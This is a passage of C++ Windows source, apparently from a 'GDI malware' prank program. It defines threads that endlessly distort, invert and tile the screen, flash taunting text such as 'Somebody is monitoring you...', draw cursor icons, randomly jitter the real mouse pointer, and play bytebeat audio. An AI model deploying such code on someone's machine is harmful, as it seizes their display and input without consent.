		StretchBlt(hdc, randx, rand() % 20, randw, h, hdc, randx, 0, randw, h, (DWORD)0x1900ac010e);
		ReleaseDC(0, hdc);
		DeleteObject(hBrush);
		Sleep(1);
	}
}

DWORD WINAPI text3(LPVOID lpParam) {
	int dwStartTime = time(NULL);
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), a;
		HDC hdc = GetWindowDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		if (w > h) {
			a = rand() % (h / 10);
		}
		else {
			a = rand() % (w / 10);
		}
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		LPCSTR text[5] = { "You didn't install Vocaloid or Piapro Studio!", "Somebody is monitoring you...", "Would you have some obsolete meat?", "You will be mezmerized!", "Will that 16-year-old girl appear?" };
		int tmp = 4 - (rand() % 5);
		SetBkColor(hcdc, RGB(255 - (rand() % 256), 255 - (rand() % 256), 255 - (rand() % 256)));
		SetTextColor(hcdc, RGB(255 - (rand() % 256), 255 - (rand() % 256), 255 - (rand() % 256)));
		HFONT font = CreateFont(a, a / 2, 0, 0, 900 - (rand() % 901), 0, 0, 0, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, 4 - (rand() % 5), (rand() % 5 << 4), "114514");
		SelectObject(hcdc, font);
		TextOutA(hcdc, w - (rand() % w), h - (rand() % h), text[tmp], strlen(text[tmp]));
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(font);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(5);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	return 0;
}

DWORD WINAPI crushscr(LPVOID lpParam) {
	int get = 1;
	int getmod = 1;
	for (;;) {
		int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y++) {
			int bei = rand() % 2;

			if (bei == 1) {
				StretchBlt(hcdc, -get, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
			}
			else {
				StretchBlt(hcdc, get, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
			}
		}
		hdc = GetDC(0);
		HDC hcdc1 = CreateCompatibleDC(hdc);
		HBITMAP hBitmap1 = CreateCompatibleBitmap(hcdc, w, h);
		SelectObject(hcdc1, hBitmap1);
		BitBlt(hcdc1, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			int bei2 = rand() % 2;

			if (bei2 == 1) {
				StretchBlt(hcdc1, x, -get, 1, h, hcdc1, x, 0, 1, h, SRCCOPY);
			}
			else {
				StretchBlt(hcdc1, x, get, 1, h, hcdc1, x, 0, 1, h, SRCCOPY);
			}
		}

		BitBlt(hdc, 0, 0, w, h, hcdc1, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hcdc);
		DeleteDC(hcdc1);
		DeleteObject(hcdc);
		DeleteObject(hcdc1);
		DeleteObject(hBitmap);
		DeleteObject(hBitmap1);
		if (get > 40) {
			getmod = 2;
		}
		else if (get == 1 && getmod == 2) {
			getmod = 1;
		}

		if (getmod == 1) {
			get += 1;
		}
		else {
			get -= 1;
		}
		Sleep(10);
	}
	return 0;
}

DWORD WINAPI ColorInvert(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(100);
	}
	return 0;
}

DWORD WINAPI cosinescreen(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(0);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int a = 1 + rand() % 64, b = 1 + rand() % 64;
		for (int y = 0; y <= h; y += 10 * wdpi / 96) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(hdc, brush);
			StretchBlt(hdc, -a * cos((float)b * y), y, w, 10, hdc, 0, y, w, 10, MERGECOPY);
			DeleteObject(brush);
			Sleep(1);
		}
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI cosinescreen2(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(0);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int a = 1 + rand() % 64, b = 1 + rand() % 64;
		for (int x = 0; x <= w; x += 10 * hdpi / 96) {
			StretchBlt(hdc, x, -a * cos((float)b * x), 10, h, hdc, x, 0, 10, h, MERGECOPY);
			Sleep(1);
		}
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI pixel10proxl(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		int clr[4] = { 57,74,37,0 }, clg[4] = { 197,255,128,196 }, clb[4] = { 187,242,121,183 }, a = rand() % 4;
		HDC hdc = GetWindowDC(0);
		SetPixel(hdc, rand() % w, rand() % h, RGB(clr[a], clr[a], clr[a]));
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI text4(LPVOID lpParam) {
	LPCWSTR lpText = L"01";
	int clr[6] = { 255,255,128,128,192,255 }, clg[6] = { 0,128,0,64,0,64 }, clb[6] = { 0,128,0,64,0,64 };
	for (;;)
	{
		int a = rand() % 6;
		HDC hdc = GetWindowDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		SetTextColor(hdc, RGB(clr[a], clg[a], clb[a]));
		SetBkMode(hdc, 1);
		TextOutW(hdc, w - (rand() % w), h - (rand() % h), lpText, wcslen(lpText));
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI profect(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		HDC hdc = GetWindowDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -(w / 10), 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w / 10 * 9, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -(h / 10), SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h / 10 * 9, SRCCOPY);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader8(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (x = y) * RGB(GetRValue(Hue(256)), GetGValue(Hue(256)), GetBValue(Hue(256)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI drawmikucur(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(NULL);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		DrawIconEx(hdc, rand() % w, rand() % h, LoadCursorA(GetModuleHandleA(0), MAKEINTRESOURCEA(1 + rand() % 15)), 64 * wdpi / 96, 64 * hdpi / 96, NULL, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % w, rand() % h, LoadCursorA(GetModuleHandleA(0), MAKEINTRESOURCEA(1 + rand() % 15)), 64 * wdpi / 96, 64 * hdpi / 96, NULL, NULL, DI_NORMAL);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI shader9(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (x >> y) * RGB(GetRValue(Hue(256)), GetGValue(Hue(256)), GetBValue(Hue(256)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI mousemikucur(LPVOID lpParam) {
	HDC hdc;
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	POINT point;
	for (;;) {
		hdc = GetWindowDC(0);
		GetCursorPos(&point);
		DrawIcon(hdc, point.x, point.y, LoadCursorA(GetModuleHandleA(0), MAKEINTRESOURCE(2)));
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI movemouse(LPVOID lpParam) {
	POINT cursor;
	for (;;) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		GetCursorPos(&cursor);
		int X = cursor.x + 1 - rand() % 3;
		int Y = cursor.y + 1 - rand() % 3;
		SetCursorPos(X, Y);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return(0);
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,24000, 24000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> (t & 16384 ? 2 : 3) & t * (t >> 5 & t >> 7) | t * (t >> 4 | t >> 6 & t >> 8) & 36 | (1 >> t));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)((t % 55500 < 2500) ? (t * 8.976) : (t % 55500 < 5000) ? (t * 8.976) : (t % 55500 < 7500) ? (t * 10.08) : (t % 55500 < 10000) ? (t * 8.976) : (t % 55500 < 12500) ? (t * 8.976) : (t % 55500 < 15000) ? (t * 10.08) : (t % 55500 < 18000) ? (t * 8.976) : (t % 55500 < 21000) ? (t * 8) : (t % 55500 < 24000) ? (t * 7.552) : (t % 55500 < 27000) ? (t * 6.728) : (t % 55500 < 28500) ? (t * 5.992) : (t % 55500 < 30000) ? (t * 6.728) : (t % 55500 < 31500) ? (t * 5.992) : (t % 55500 < 33000) ? (t * 6.728) : (t % 55500 < 34500) ? (t * 5.992) : (t % 55500 < 36000) ? (t * 6.728) : (t % 55500 < 40000) ? (t * 5.992) : (t % 55500 < 41500) ? (t * 7.552) : (t % 55500 < 43000) ? (t * 8) : (t % 55500 < 44500) ? (t * 7.552) : (t % 55500 < 46000) ? (t * 8) : (t % 55500 < 48500) ? (t * 7.552) : (t % 55500 < 51000) ? (t * 6.728) : (t % 55500 < 55500) ? (t * 5.992) : 0) ^ t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 6 | t >> (t >> 15)) + (t >> 9 & t));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,10240, 10240, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[10240 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)((t % 114000 < 3000) ? (t * 5.992) : (t % 114000 < 6000) ? (t * 5.992) : (t % 114000 < 9000) ? (t * 5.992) : (t % 114000 < 11000) ? (t * 5.656) : (t % 114000 < 13000) ? (t * 5.04) : (t % 114000 < 19000) ? (t * 5.656) : (t % 114000 < 23000) ? (t * 6.728) : (t % 114000 < 25000) ? (t * 4.488) : (t % 114000 < 27000) ? (t * 5.04) : (t % 114000 < 29000) ? (t * 5.656) : (t % 114000 < 33000) ? (t * 5.656) : (t % 114000 < 37000) ? (t * 5.656) : (t % 114000 < 40000) ? (t * 5.656) : (t % 114000 < 42000) ? (t * 5.04) : (t % 114000 < 44000) ? (t * 4.488) : (t % 114000 < 49000) ? (t * 4.24) : (t % 114000 < 51000) ? (t * 3.36) : (t % 114000 < 55000) ? (t * 3.36) : (t % 114000 < 57000) ? (t * 3) : (t % 114000 < 61000) ? (t * 2.832) : (t % 114000 < 64000) ? (t * 5.992) : (t % 114000 < 67000) ? (t * 5.992) : (t % 114000 < 70000) ? (t * 5.992) : (t % 114000 < 72000) ? (t * 5.656) : (t % 114000 < 74000) ? (t * 5.04) : (t % 114000 < 80000) ? (t * 5.656) : (t % 114000 < 84000) ? (t * 6.728) : (t % 114000 < 86000) ? (t * 4.488) : (t % 114000 < 88000) ? (t * 5.04) : (t % 114000 < 90000) ? (t * 5.656) : (t % 114000 < 94000) ? (t * 5.656) : (t % 114000 < 98000) ? (t * 5.656) : (t % 114000 < 101000) ? (t * 5.656) : (t % 114000 < 103000) ? (t * 5.04) : (t % 114000 < 105000) ? (t * 4.488) : (t % 114000 < 114000) ? (t * 4.24) : 0) - t & t >> 7 >> t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,10000, 10000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[10000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)((t % 128000 < 2000) ? (t * 4.488) : (t % 128000 < 4000) ? (t * 5.656) : (t % 128000 < 6000) ? (t * 6.728) : (t % 128000 < 10000) ? (t * 7.552) : (t % 128000 < 14000) ? (t * 4.488) : (t % 128000 < 18000) ? (t * 6.728) : (t % 128000 < 22000) ? (t * 4.488) : (t % 128000 < (22000 + (4000 / 3) * 2)) ? (t * 4.24) : (t % 128000 < (22000 + (4000 / 3) * 4)) ? (t * 6.728) : (t % 128000 < 32000) ? (t * 5.656) : (t % 128000 < 34000) ? (t * 4.488) : (t % 128000 < 36000) ? (t * 5.656) : (t % 128000 < 38000) ? (t * 6.728) : (t % 128000 < 42000) ? (t * 7.552) : (t % 128000 < 46000) ? (t * 4.488) : (t % 128000 < 50000) ? (t * 6.728) : (t % 128000 < 54000) ? (t * 4.488) : (t % 128000 < (54000 + (4000 / 3) * 2)) ? (t * 4.24) : (t % 128000 < (54000 + (4000 / 3) * 4)) ? (t * 6.728) : (t % 128000 < 64000) ? (t * 5.656) : (t % 128000 < 66000) ? (t * 8.976) : (t % 128000 < 68000) ? (t * 10.08) : (t % 128000 < 70000) ? (t * 11.312) : (t % 128000 < 74000) ? (t * 22.624) : (t % 128000 < 78000) ? (t * 13.456) : (t % 128000 < 82000) ? (t * 20.184) : (t % 128000 < 86000) ? (t * 13.456) : (t % 128000 < (86000 + (4000 / 3) * 2)) ? (t * 11.312) : (t % 128000 < (86000 + (4000 / 3) * 4)) ? (t * 17.96) : (t % 128000 < 96000) ? (t * 13.456) : (t % 128000 < 98000) ? (t * 4.488) : (t % 128000 < 100000) ? (t * 5.656) : (t % 128000 < 102000) ? (t * 6.728) : (t % 128000 < 106000) ? (t * 7.552) : (t % 128000 < 110000) ? (t * 4.488) : (t % 128000 < 114000) ? (t * 6.728) : (t % 128000 < 118000) ? (t * 4.488) : (t % 128000 < (118000 + (4000 / 3) * 2)) ? (t * 4.232) : (t % 128000 < (118000 + (4000 / 3) * 4)) ? (t * 5.04) : (t % 128000 < 128000) ? (t * 4.488) : 0) - t & t >> 8);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,32768, 32768, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32768 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 6 | t >> (t >> 167 & t >> 11)) / 65536);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,32768, 32768, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32768 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 6 | t >> (t >> 167 & t >> 11)) + 9);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)((t % 114000 < 3000) ? (t * 5.992) : (t % 114000 < 6000) ? (t * 5.992) : (t % 114000 < 9000) ? (t * 5.992) : (t % 114000 < 11000) ? (t * 5.656) : (t % 114000 < 13000) ? (t * 5.04) : (t % 114000 < 19000) ? (t * 5.656) : (t % 114000 < 23000) ? (t * 6.728) : (t % 114000 < 25000) ? (t * 4.488) : (t % 114000 < 27000) ? (t * 5.04) : (t % 114000 < 29000) ? (t * 5.656) : (t % 114000 < 33000) ? (t * 5.656) : (t % 114000 < 37000) ? (t * 5.656) : (t % 114000 < 40000) ? (t * 5.656) : (t % 114000 < 42000) ? (t * 5.04) : (t % 114000 < 44000) ? (t * 4.488) : (t % 114000 < 49000) ? (t * 4.24) : (t % 114000 < 51000) ? (t * 3.36) : (t % 114000 < 55000) ? (t * 3.36) : (t % 114000 < 57000) ? (t * 3) : (t % 114000 < 61000) ? (t * 2.832) : (t % 114000 < 64000) ? (t * 5.992) : (t % 114000 < 67000) ? (t * 5.992) : (t % 114000 < 70000) ? (t * 5.992) : (t % 114000 < 72000) ? (t * 5.656) : (t % 114000 < 74000) ? (t * 5.04) : (t % 114000 < 80000) ? (t * 5.656) : (t % 114000 < 84000) ? (t * 6.728) : (t % 114000 < 86000) ? (t * 4.488) : (t % 114000 < 88000) ? (t * 5.04) : (t % 114000 < 90000) ? (t * 5.656) : (t % 114000 < 94000) ? (t * 5.656) : (t % 114000 < 98000) ? (t * 5.656) : (t % 114000 < 101000) ? (t * 5.656) : (t % 114000 < 103000) ? (t * 5.04) : (t % 114000 < 105000) ? (t * 4.488) : (t % 114000 < 114000) ? (t * 4.24) : 0) | t ^ t >> t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,8192, 8192, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8192 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)((t % 114000 < 3000) ? (t * 5.992) : (t % 114000 < 6000) ? (t * 5.992) : (t % 114000 < 9000) ? (t * 5.992) : (t % 114000 < 11000) ? (t * 5.656) : (t % 114000 < 13000) ? (t * 5.04) : (t % 114000 < 19000) ? (t * 5.656) : (t % 114000 < 23000) ? (t * 6.728) : (t % 114000 < 25000) ? (t * 4.488) : (t % 114000 < 27000) ? (t * 5.04) : (t % 114000 < 29000) ? (t * 5.656) : (t % 114000 < 33000) ? (t * 5.656) : (t % 114000 < 37000) ? (t * 5.656) : (t % 114000 < 40000) ? (t * 5.656) : (t % 114000 < 42000) ? (t * 5.04) : (t % 114000 < 44000) ? (t * 4.488) : (t % 114000 < 49000) ? (t * 4.24) : (t % 114000 < 51000) ? (t * 3.36) : (t % 114000 < 55000) ? (t * 3.36) : (t % 114000 < 57000) ? (t * 3) : (t % 114000 < 61000) ? (t * 2.832) : (t % 114000 < 64000) ? (t * 5.992) : (t % 114000 < 67000) ? (t * 5.992) : (t % 114000 < 70000) ? (t * 5.992) : (t % 114000 < 72000) ? (t * 5.656) : (t % 114000 < 74000) ? (t * 5.04) : (t % 114000 < 80000) ? (t * 5.656) : (t % 114000 < 84000) ? (t * 6.728) : (t % 114000 < 86000) ? (t * 4.488) : (t % 114000 < 88000) ? (t * 5.04) : (t % 114000 < 90000) ? (t * 5.656) : (t % 114000 < 94000) ? (t * 5.656) : (t % 114000 < 98000) ? (t * 5.656) : (t % 114000 < 101000) ? (t * 5.656) : (t % 114000 < 103000) ? (t * 5.04) : (t % 114000 < 105000) ? (t * 4.488) : (t % 114000 < 114000) ? (t * 4.24) : 0) - t << t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,32768, 32768, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32768 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 6 | t >> (t >> 167 & t >> 11)) / 65536);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)((t % 128000 < 4000) ? (t * 3.728) : (t % 128000 < 8000) ? (t * 5.592) : (t % 128000 < 12000) ? (t * 3.728) : (t % 128000 < 16000) ? (t * 5.592) : (t % 128000 < 18000) ? (t * 4.986) : (t % 128000 < 20000) ? (t * 5.586) : (t % 128000 < 22000) ? (t * 4.986) : (t % 128000 < 24000) ? (t * 4.436) : (t % 128000 < 28000) ? (t * 4.185) : (t % 128000 < 32000) ? (t * 3.314) : (t % 128000 < 36000) ? (t * 3.728) : (t % 128000 < 40000) ? (t * 5.592) : (t % 128000 < 44000) ? (t * 3.728) : (t % 128000 < 48000) ? (t * 5.592) : (t % 128000 < 50000) ? (t * 4.986) : (t % 128000 < 52000) ? (t * 5.586) : (t % 128000 < 54000) ? (t * 4.986) : (t % 128000 < 56000) ? (t * 4.436) : (t % 128000 < 60000) ? (t * 6.628) : (t % 128000 < 64000) ? (t * 5.592) : (t % 128000 < 68000) ? (t * 3.728) : (t % 128000 < 72000) ? (t * 5.592) : (t % 128000 < 76000) ? (t * 3.728) : (t % 128000 < 80000) ? (t * 5.592) : (t % 128000 < 82000) ? (t * 4.986) : (t % 128000 < 84000) ? (t * 5.586) : (t % 128000 < 86000) ? (t * 4.986) : (t % 128000 < 88000) ? (t * 4.436) : (t % 128000 < 92000) ? (t * 4.185) : (t % 128000 < 96000) ? (t * 3.314) : (t % 128000 < 100000) ? (t * 3) : (t % 128000 < 104000) ? (t * 5.592) : (t % 128000 < 108000) ? (t * 3) : (t % 128000 < 112000) ? (t * 5.592) : (t % 128000 < 114000) ? (t * 4.986) : (t % 128000 < 116000) ? (t * 5.586) : (t % 128000 < 118000) ? (t * 4.986) : (t % 128000 < 120000) ? (t * 4.436) : (t % 128000 < 124000) ? (t * 6.628) : (t % 128000 